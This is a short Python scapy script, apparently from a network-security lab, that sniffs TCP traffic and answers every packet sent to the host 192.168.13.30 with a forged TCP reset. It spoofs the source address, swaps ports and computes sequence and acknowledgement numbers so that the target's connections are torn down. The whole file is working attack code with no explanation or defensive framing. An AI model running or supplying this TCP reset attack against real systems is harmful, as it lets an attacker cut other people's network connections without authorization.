from scapy.all import *
import random

target_ip = "192.168.13.30"

def pkt_callback(packet):
    if (TCP in packet):
        #print("%s -> %s" % (packet[IP].src, packet[IP].dst))
        #print("len: %d" % packet[IP].len)
        #print("seq: %d, ack: %d" % (packet[TCP].seq, packet[TCP].ack))
        #print("next seq: %d, next ack: %d" % (packet[TCP].ack, packet[TCP].seq + len(packet[TCP])-32))
        if (packet[IP].dst == target_ip):
            resetPkt = (IP()/TCP())
            #set reset packet
            resetPkt[TCP].flags = 'R'
            #the seq number should be whatever was last acked
            #the ack number should be whatever the last seq was + len of data
            resetPkt[TCP].dport = packet[TCP].sport
            resetPkt[TCP].sport = packet[TCP].dport
            resetPkt[TCP].window = packet[TCP].window
            resetPkt[TCP].seq = packet[TCP].ack
            resetPkt[TCP].ack = packet[TCP].seq + len(packet[TCP])-32
            resetPkt[IP].src = packet[IP].dst
            resetPkt[IP].dst = packet[IP].src
            resetPkt.show()
            send(resetPkt)


random.seed()
interface = "ens10"
conf.verb = 0
sniff(iface=interface, prn=pkt_callback, filter="tcp", store=0)
